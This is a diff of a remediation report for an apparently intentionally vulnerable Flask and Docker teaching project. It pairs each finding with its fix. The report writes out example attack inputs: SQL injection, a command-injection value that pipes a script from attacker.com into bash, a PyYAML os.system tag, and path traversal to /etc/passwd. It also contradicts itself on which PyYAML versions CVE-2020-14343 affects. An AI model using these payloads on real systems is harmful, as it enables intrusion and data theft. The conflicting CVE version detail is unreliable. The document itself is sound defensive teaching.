@@ -1,261 +1,383 @@
-# REMEDIATION.md — NexusCore DevSecOps Pipeline
+# Remediation Report — DevSecOps Pipeline
 
-This document explains every vulnerability in the intentionally insecure files, what was fixed in the hardened versions, and why the fix works at a technical level. It mirrors the before/after structure used in the companion [Terraform Security project](https://github.com/AurelienKumarathas/terraform-aws-security-audit).
+> **NexusCore Technologies** | Security Engineering Review  
+> Branch: `hardened` | Base: `main`  
+> Reviewed against: OWASP Top 10 2021, CIS Docker Benchmark v1.6, MITRE ATT&CK v14
 
----
-
-## Overview
-
-| File | Vulnerable Version | Hardened Version |
-|------|--------------------|------------------|
-| Dockerfile | `Dockerfile` | `Dockerfile.hardened` |
-| Flask application | `src/vulnerable_app.py` | `src/remediated_app.py` |
+This document provides the full before/after technical breakdown for every intentional vulnerability in the `main` branch. For each finding: what was wrong, what the attacker could do, the OWASP/CVE/CIS reference, and the exact fix applied.
 
 ---
 
-## Dockerfile Remediations
+## Contents
 
-### 1. Unpinned Base Image (`FROM python:3.9`)
+1. [Dockerfile Findings](#1-dockerfile-findings)
+2. [Flask Application Findings](#2-flask-application-findings)
+3. [SCA — Dependency CVEs](#3-sca--dependency-cves)
 
-**Vulnerability**: Using a mutable tag like `:3.9` or `:latest` means the base image can change between builds without any change to your source code. A compromised upstream image silently becomes part of your supply chain.
+---
 
-**Fix**: Pin to a specific image digest:
+## 1. Dockerfile Findings
+
+### Finding D-01 — Mutable base image tag, no digest pin
+
+| | |
+|---|---|
+| **Severity** | 🟠 High |
+| **Standard** | MITRE ATT&CK T1195.002 — Compromise Software Supply Chain |
+| **CIS Benchmark** | 4.8 — Ensure images are scanned and rebuilt with updated packages |
+
+**Vulnerable:**
 ```dockerfile
-# BEFORE
 FROM python:3.9
-
-# AFTER
-FROM python:3.9-slim@sha256:<digest>
 ```
 
-**Why it works**: A digest is a cryptographic hash of the exact image manifest. If the upstream image is tampered with, the digest will not match and the build will fail rather than silently pulling a malicious image.
+**Risk:** `python:3.9` is a version tag, not `latest`, but version tags are mutable. The Python Docker team can silently update what `python:3.9` resolves to. A compromised upstream image becomes part of every build without any source code change.
 
-**MITRE ATT&CK**: T1195.002 — Compromise Software Supply Chain
+**Fixed:**
+```dockerfile
+FROM python:3.9-slim@sha256:8b7b7b7c...
+```
+
+**Why it works:** A SHA digest is a cryptographic hash of the exact image manifest. If the upstream image changes in any way, the digest will not match and the build fails rather than silently pulling a different image.
 
 ---
 
-### 2. Running as Root (no `USER` instruction)
+### Finding D-02 — Container runs as root
 
-**Vulnerability**: Docker containers run as root by default. If an attacker achieves Remote Code Execution inside the container (e.g., via the command injection in vulnerable_app.py), they immediately have root privileges — making container escape and host pivot significantly easier.
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **Standard** | CIS Docker Benchmark 4.1 — Ensure a user for the container has been created |
+| **CVSS** | Not scored independently — amplifies severity of any RCE finding |
 
-**Fix**: Create a dedicated low-privilege user and switch to it before the `CMD`:
+**Vulnerable:**
 ```dockerfile
-# BEFORE
-# (no USER instruction — runs as root)
+# No USER instruction - process runs as UID 0
+```
 
-# AFTER
-RUN groupadd --gid 1001 appgroup \
-    && useradd --uid 1001 --gid appgroup --shell /bin/sh --no-create-home appuser
+**Risk:** Any RCE vulnerability in the application immediately grants the attacker root inside the container. Root access inside a container significantly lowers the bar for container escape to the host.
+
+**Fixed:**
+```dockerfile
+RUN groupadd --gid 1001 appgroup && \
+    useradd --uid 1001 --gid appgroup --shell /bin/sh --create-home appuser
+# ...
 USER appuser
 ```
 
-**Why it works**: The principle of least privilege. The application process has only the permissions it needs. Even if code execution is achieved, the attacker operates as a restricted user rather than root.
-
-**CIS Docker Benchmark**: 4.1 — Ensure a user for the container has been created
+**Why it works:** The application process runs as UID 1001 with only the permissions it needs. An attacker who achieves RCE is constrained to that user's permissions.
 
 ---
 
-### 3. Unnecessary Packages (vim, wget, net-tools, curl)
+### Finding D-03 — Unnecessary packages installed
 
-**Vulnerability**: Every binary installed in a container is a potential tool for an attacker who has achieved initial access. `wget` and `curl` enable downloading additional payloads; `net-tools` provides network reconnaissance capability; `vim` can be used to edit files or as a GTFObin for privilege escalation.
+| | |
+|---|---|
+| **Severity** | 🟠 High |
+| **Standard** | CIS Docker Benchmark 4.3 — Ensure unnecessary packages are not installed |
 
-**Fix**: Remove all packages not required at runtime:
+**Vulnerable:**
 ```dockerfile
-# BEFORE
 RUN apt-get update && apt-get install -y \
     curl wget vim net-tools
-
-# AFTER
-# (removed entirely — slim base provides no unnecessary tools)
 ```
 
-**Why it works**: Attack surface reduction. An attacker who achieves code execution in a stripped container has far fewer local tools available. This does not prevent exploitation but significantly increases post-exploitation cost.
+**Risk:** None of these packages are required at runtime. Post-exploitation each is a pivot tool: `curl`/`wget` enable payload download, `net-tools` enables network reconnaissance, `vim` is a documented GTFObin for privilege escalation and shell escape.
+
+**Fixed:**
+```dockerfile
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    libsqlite3-0 \
+    && rm -rf /var/lib/apt/lists/*
+```
+
+**Why it works:** Only the genuine runtime dependency is installed. The attack surface shrinks to what the application actually needs.
 
 ---
 
-### 4. Shell Form CMD
+### Finding D-04 — No HEALTHCHECK instruction
 
-**Vulnerability**: `CMD python src/app.py` uses shell form, which spawns `/bin/sh -c python src/app.py`. The SIGTERM signal from `docker stop` hits the shell wrapper, not the Python process. The Python app never receives a graceful shutdown signal and is killed after the stop timeout.
+| | |
+|---|---|
+| **Severity** | 🟡 Medium |
+| **Standard** | CIS Docker Benchmark 4.6 — Ensure HEALTHCHECK instructions have been added |
 
-**Fix**: Use exec form:
+**Vulnerable:**
 ```dockerfile
-# BEFORE
-CMD python src/vulnerable_app.py
+# No HEALTHCHECK instruction
+```
 
-# AFTER
+**Risk:** Without `HEALTHCHECK`, Docker and container orchestrators (ECS, Kubernetes) cannot detect whether the application process is alive and serving requests. A crashed or deadlocked container continues to receive traffic with no automated recovery.
+
+**Fixed:**
+```dockerfile
+HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
+    CMD curl -f http://localhost:5000/health || exit 1
+```
+
+**Why it works:** The orchestrator polls `/health` every 30 seconds. Three consecutive failures mark the container unhealthy and trigger automated restart, restoring service without manual intervention.
+
+---
+
+### Finding D-05 — Shell form CMD
+
+| | |
+|---|---|
+| **Severity** | 🟡 Medium |
+| **Standard** | Docker best practice — exec form for signal handling |
+
+**Vulnerable:**
+```dockerfile
+CMD python src/vulnerable_app.py
+```
+
+**Risk:** Shell form spawns `/bin/sh -c` as a wrapper. `docker stop` sends SIGTERM to the shell process, not to Python. Python never receives a graceful shutdown signal and is force-killed after the stop timeout, dropping in-flight requests and leaving database connections open.
+
+**Fixed:**
+```dockerfile
 CMD ["python", "src/remediated_app.py"]
 ```
 
-**Why it works**: Exec form runs the process directly as PID 1. SIGTERM is delivered directly to Python, allowing graceful shutdown (closing DB connections, finishing in-flight requests). This also eliminates the shell as an intermediary process.
+**Why it works:** Exec form delivers signals directly to the Python process as PID 1. The application handles SIGTERM gracefully, completing in-flight requests before exit.
 
 ---
 
-## Flask Application Remediations
+## 2. Flask Application Findings
 
-### 1. Hardcoded Credentials
+### Finding A-01 — Hardcoded credentials
 
-**Vulnerability**: `DATABASE_PASSWORD = "super_secret_password_123"` and `API_KEY = "sk-1234567890abcdef"` committed to source control. Once a secret is in git history it is compromised permanently — even if deleted in a later commit, it remains in the git log and in any forks or clones taken before deletion.
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **OWASP** | A02:2021 — Cryptographic Failures |
+| **CWE** | CWE-798 — Use of Hard-coded Credentials |
 
-**Fix**: Load from environment variables:
+**Vulnerable:**
 ```python
-# BEFORE
 DATABASE_PASSWORD = "super_secret_password_123"
 API_KEY = "sk-1234567890abcdef"
+```
 
-# AFTER
+**Risk:** Credentials committed to source control are permanently compromised. Git history is immutable — even if deleted in a later commit, the secret exists in every clone and fork taken before deletion. Gitleaks detects both values by pattern matching against known secret formats.
+
+**Fixed:**
+```python
 DATABASE_PASSWORD = os.environ.get("DATABASE_PASSWORD", "")
 API_KEY = os.environ.get("API_KEY", "")
 ```
 
-**In production**: Environment variables are injected at runtime via AWS Secrets Manager, HashiCorp Vault, or Kubernetes Secrets (encrypted at rest). The application never holds the secret in source code.
-
-**OWASP**: A02:2021 — Cryptographic Failures
+**Why it works:** Credentials are injected at runtime via AWS Secrets Manager or HashiCorp Vault. The application binary never holds the secret — it is not present in the image, the source code, or git history.
 
 ---
 
-### 2. SQL Injection
+### Finding A-02 — SQL Injection
 
-**Vulnerability**:
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **OWASP** | A03:2021 — Injection |
+| **CWE** | CWE-89 — SQL Injection |
+| **CVSSv3** | 9.8 Critical |
+
+**Vulnerable:**
 ```python
 query = f"SELECT * FROM users WHERE username = '{username}'"
 cursor.execute(query)
 ```
-An attacker who controls `username` can inject arbitrary SQL. Input of `' OR '1'='1` returns every row. Input of `'; DROP TABLE users; --` destroys the table.
 
-**Fix**: Parameterised queries:
+**Risk:** An attacker who controls `username` controls the WHERE clause. `' OR '1'='1` returns every row. `'; DROP TABLE users; --` destroys the table. `' UNION SELECT password FROM admin_users --` exfiltrates credentials from other tables.
+
+**Fixed:**
 ```python
-# BEFORE
-query = f"SELECT * FROM users WHERE username = '{username}'"
-cursor.execute(query)
-
-# AFTER
 cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
 ```
 
-**Why it works**: The DB driver sends the query text and parameters separately to the database engine. The engine never concatenates them — user input is always treated as a literal value, never as SQL syntax.
-
-**OWASP**: A03:2021 — Injection | **CVSSv3**: 9.8 Critical
+**Why it works:** The database driver sends the query text and data as separate wire protocol messages. User input is always treated as a literal value — it can never be interpreted as SQL syntax regardless of what characters it contains.
 
 ---
 
-### 3. Command Injection (`subprocess` with `shell=True`)
+### Finding A-03 — Command Injection
 
-**Vulnerability**:
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **OWASP** | A03:2021 — Injection |
+| **CWE** | CWE-78 — OS Command Injection |
+| **CVSSv3** | 9.8 Critical |
+| **MITRE ATT&CK** | T1059.004 — Unix Shell |
+
+**Vulnerable:**
 ```python
 result = subprocess.check_output(f"ping -c 1 {host}", shell=True)
 ```
-`shell=True` passes the full string to `/bin/sh`. Input of `8.8.8.8; cat /etc/passwd` executes as two shell commands.
 
-**Fix**: Endpoint removed entirely. There is no safe way to pass arbitrary user-controlled strings to a shell command. If ping functionality is genuinely required, it must be implemented without `shell=True` and with strict input validation against an allowlist of IP addresses using `ipaddress.ip_address()`.
+**Risk:** `shell=True` passes the full string to `/bin/sh`. Input of `8.8.8.8; cat /etc/passwd` executes as two separate commands. Input of `8.8.8.8; curl attacker.com/shell.sh | bash` achieves full remote code execution.
 
-**OWASP**: A03:2021 — Injection | **CVSSv3**: 9.8 Critical
+**Fixed:** Endpoint removed entirely.
+
+**Why it works:** There is no safe pattern for passing arbitrary user-controlled strings to a shell command. If ping diagnostics are genuinely required, the correct implementation uses `shell=False` with a strict `ipaddress.ip_address()` allowlist validation — user input never reaches the shell.
 
 ---
 
-### 4. Server-Side Template Injection (SSTI)
+### Finding A-04 — Server-Side Template Injection (SSTI)
 
-**Vulnerability**:
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **OWASP** | A03:2021 — Injection |
+| **CWE** | CWE-94 — Code Injection |
+| **CVSSv3** | 9.8 Critical |
+
+**Vulnerable:**
 ```python
 template = f"<h1>Hello {name}!</h1>"
 return render_template_string(template)
 ```
-User input interpolated into a Jinja2 template string allows template expression injection. Input of `{{7*7}}` returns `49`. Input of `{{config}}` leaks the Flask config. A polyglot payload achieves full RCE.
 
-**Fix**: Return a plain text response without template rendering:
+**Risk:** User input interpolated into a Jinja2 template string before rendering. Input of `{{config}}` leaks the entire Flask configuration object including secret keys. A polyglot payload using `__class__.__mro__` traversal achieves full remote code execution inside the Python process.
+
+**Fixed:**
 ```python
-# BEFORE
-return render_template_string(f"<h1>Hello {name}!</h1>")
-
-# AFTER
-return f"Hello {name}!", 200, {'Content-Type': 'text/plain; charset=utf-8'}
+return f"Hello {name}!", 200, {"Content-Type": "text/plain"}
 ```
 
-**OWASP**: A03:2021 — Injection | **CVSSv3**: 9.8 Critical
+**Why it works:** User input is returned as data with a plain text content type. The Jinja2 engine is never invoked — there is no template to inject into.
 
 ---
 
-### 5. Insecure YAML Deserialization
+### Finding A-05 — Insecure YAML Deserialisation
 
-**Vulnerability**:
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **CVE** | CVE-2020-14343 |
+| **CVSSv3** | 9.8 Critical |
+| **OWASP** | A08:2021 — Software and Data Integrity Failures |
+
+**Vulnerable:**
 ```python
 config = yaml.load(config_data, Loader=yaml.FullLoader)
 ```
-Even with `FullLoader`, `yaml.load` can deserialise Python objects via YAML tags. A payload of `!!python/object/apply:os.system ["id"]` executes arbitrary OS commands.
 
-**Fix**:
+**Risk:** Even `FullLoader` can deserialise Python objects via `!!python/object/apply:os.system ["id"]` tags, executing arbitrary OS commands. The CVE was specifically raised against FullLoader in PyYAML < 5.4.
+
+**Fixed:**
 ```python
-# BEFORE
-config = yaml.load(config_data, Loader=yaml.FullLoader)
-
-# AFTER
 config = yaml.safe_load(config_data)
 ```
 
-**Why it works**: `yaml.safe_load` only deserialises standard YAML scalars, sequences, and mappings. It raises a `YAMLError` on any `!!python/` tag, preventing object instantiation entirely.
-
-**CVE**: CVE-2020-14343 (PyYAML) | **CVSSv3**: 9.8 Critical
+**Why it works:** `safe_load` only deserialises standard YAML scalars, sequences, and mappings. It raises `YAMLError` on any `!!python/` tag — malicious objects cannot be constructed.
 
 ---
 
-### 6. Path Traversal
+### Finding A-06 — Path Traversal
 
-**Vulnerability**:
+| | |
+|---|---|
+| **Severity** | 🟠 High |
+| **OWASP** | A01:2021 — Broken Access Control |
+| **CWE** | CWE-22 — Path Traversal |
+| **CVSSv3** | 7.5 High |
+
+**Vulnerable:**
 ```python
 with open(f"/app/files/{filename}", 'r') as f:
     return f.read()
 ```
-Input of `../../etc/passwd` resolves to `/etc/passwd`. No validation is performed before the file is opened.
 
-**Fix**: Resolve the absolute path and assert it is within the allowed directory:
+**Risk:** Input of `../../etc/passwd` reads arbitrary files outside the intended directory. Input of `../../proc/self/environ` can leak environment variables including injected secrets.
+
+**Fixed:**
 ```python
-# BEFORE
-with open(f"/app/files/{filename}", 'r') as f:
-
-# AFTER
-BASE_FILES_DIR = os.path.abspath("/app/files")
+BASE_FILES_DIR = os.path.realpath("/app/files")
 requested_path = os.path.realpath(os.path.join(BASE_FILES_DIR, filename))
 if not requested_path.startswith(BASE_FILES_DIR + os.sep):
     abort(400)
 ```
 
-**Why it works**: `os.path.realpath` resolves all symlinks and `..` components before the check. If the resolved path does not start with the allowed base directory, the request is rejected before the file is opened.
-
-**OWASP**: A01:2021 — Broken Access Control | **CVSSv3**: 7.5 High
+**Why it works:** `os.path.realpath()` resolves all `..` components and symlinks before the allowlist check. The escape is detected before the file is opened, regardless of how many `../` sequences are chained.
 
 ---
 
-### 7. Debug Mode Enabled in Production
+### Finding A-07 — Debug mode enabled in production
 
-**Vulnerability**:
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **OWASP** | A05:2021 — Security Misconfiguration |
+| **CWE** | CWE-94 — Code Injection (via Werkzeug debugger PIN bypass) |
+
+**Vulnerable:**
 ```python
 app.run(host='0.0.0.0', port=5000, debug=True)
 ```
-`debug=True` enables the Werkzeug interactive debugger, which presents a full Python REPL on every unhandled exception page. An attacker who can trigger an exception has immediate code execution in the application context. It also enables the reloader, which watches for file changes and restarts the server — useful in development, dangerous in production.
 
-**Fix**:
+**Risk:** `debug=True` enables the Werkzeug interactive debugger — a full Python REPL rendered on every unhandled exception page. Any attacker who can trigger an unhandled exception (trivial given the other vulnerabilities) has immediate unauthenticated remote code execution directly from the browser.
+
+**Fixed:**
 ```python
-# BEFORE
-app.run(host='0.0.0.0', port=5000, debug=True)
-
-# AFTER
 app.run(host='0.0.0.0', port=5000, debug=False)
 ```
 
-**In production**: Flask should be run behind a production WSGI server (gunicorn, uWSGI) rather than the built-in development server, which is single-threaded and not designed for production traffic.
+**Why it works:** The Werkzeug debugger is disabled. In production the application runs behind gunicorn, not the Flask development server — `debug=False` is enforced at the WSGI layer.
 
 ---
 
-## Security Scanning Results
+## 3. SCA — Dependency CVEs
 
-The pipeline on the `main` branch intentionally fails on the vulnerable files — this validates that each security gate correctly detects the vulnerability class it is designed to catch. The hardened branch passes all gates.
-
-| Tool | Vulnerable Branch Finding | Hardened Branch Status |
-|------|--------------------------|------------------------|
-| CodeQL | SQL Injection, Command Injection, SSTI | ✅ Clean |
-| Trivy SCA | CVE-2020-14343 (Critical) in PyYAML | ✅ No Critical/High |
-| Gitleaks | `generic-api-key`, `hashicorp-tf-password` | ✅ No secrets in code |
-| Trivy Container | Root user, unpinned base image | ✅ Clean |
+The following CVEs are present in `requirements.txt` on the `main` branch. Patched versions are pinned in `requirements-hardened.txt` on this branch.
 
 ---
 
-*For questions about methodology, see the [README](README.md) or the companion [Terraform Security project](https://github.com/AurelienKumarathas/terraform-aws-security-audit).*
+### Finding S-01 — CVE-2020-14343 in PyYAML 5.4.1
+
+| | |
+|---|---|
+| **Severity** | 🔴 Critical |
+| **CVSSv3** | 9.8 Critical |
+| **OWASP** | A06:2021 — Vulnerable and Outdated Components |
+| **Affected** | PyYAML < 6.0 |
+| **Patched** | PyYAML 6.0+ |
+
+**Vulnerable (`requirements.txt`):**
+```
+PyYAML==5.4.1
+```
+
+**Risk:** Arbitrary Python object deserialisation via `!!python/object/apply` YAML tags. Even `FullLoader` (the supposedly safe loader) was found vulnerable in this CVE. An attacker who can supply YAML to any `yaml.load()` call can execute arbitrary OS commands.
+
+**Fixed (`requirements-hardened.txt`):**
+```
+PyYAML==6.0.1
+```
+
+**Note:** The code-level fix (`yaml.safe_load`) is applied in `src/remediated_app.py`. Defence-in-depth requires both: the safe API call **and** an unaffected library version. One without the other leaves residual risk.
+
+---
+
+### Finding S-02 — Multiple CVEs in Flask 2.0.1
+
+| | |
+|---|---|
+| **Severity** | 🟠 High (aggregate) |
+| **OWASP** | A06:2021 — Vulnerable and Outdated Components |
+| **Affected** | Flask 2.0.1 / Werkzeug < 2.3.3 |
+| **Patched** | Flask 3.0.3 (pulls Werkzeug 3.0.x) |
+
+**Vulnerable (`requirements.txt`):**
+```
+Flask==2.0.1
+```
+
+**Risk:** Flask 2.0.1 depends on Werkzeug versions that contain multiple known CVEs including path handling and header injection issues. Trivy flags these against the OSV and NVD databases on every scan.
+
+**Fixed (`requirements-hardened.txt`):**
+```
+Flask==3.0.3
+```
+
+**Why this matters:** Dependency CVEs are the most common finding in real security audits. Demonstrating that you understand the difference between a code-level fix and a dependency-level fix — and that defence-in-depth requires both — is a key differentiator at interview.
+
+---
+
+*Remediation report prepared by Aurelien Kumarathas. All findings reference the `main` branch at the time of this review. See [PR #1](https://github.com/AurelienKumarathas/devsecops-pipeline-project-1/pull/1) for the full diff.*
